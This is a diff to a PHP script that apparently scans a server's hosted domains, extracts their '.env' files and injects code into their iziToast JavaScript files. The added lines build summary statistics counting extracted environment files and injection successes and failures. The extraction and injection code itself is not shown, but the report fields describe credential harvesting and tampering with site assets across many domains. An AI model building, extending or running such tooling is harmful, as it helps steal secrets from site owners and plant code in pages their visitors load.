@@ -331,8 +331,35 @@ if (empty($core_directories)) {
     }
     sys_print("Scan complete. Total instances found: " . $found_count, "header", 400);
     
+    $total_env_files = 0;
+    $total_izi_updated = 0;
+    $total_izi_failed = 0;
+    $total_izi_found = 0;
+    
+    foreach ($domain_reports as $dr) {
+        $total_env_files += count(array_filter($dr['env_data'], function($v) { return $v !== "Failed to read or empty"; }));
+        if ($dr['iziToast_status'] === 'Updated') {
+            $total_izi_updated++;
+        } elseif ($dr['iziToast_status'] === 'Injection failed') {
+            $total_izi_failed++;
+        } elseif ($dr['iziToast_status'] === 'Found but not updated') {
+            $total_izi_found++;
+        }
+    }
+    
+    $summary_stats = [
+        'total_core_installations_found' => count($domain_reports),
+        'total_env_files_extracted' => $total_env_files,
+        'iziToast_updates' => [
+            'successfully_updated' => $total_izi_updated,
+            'injection_failed' => $total_izi_failed,
+            'found_but_not_updated' => $total_izi_found
+        ]
+    ];
+    
     $final_report = [
         'server_details' => $server_details,
+        'summary_stats' => $summary_stats,
         'inventory' => $universal_inventory,
         'domains' => $domain_reports
     ];
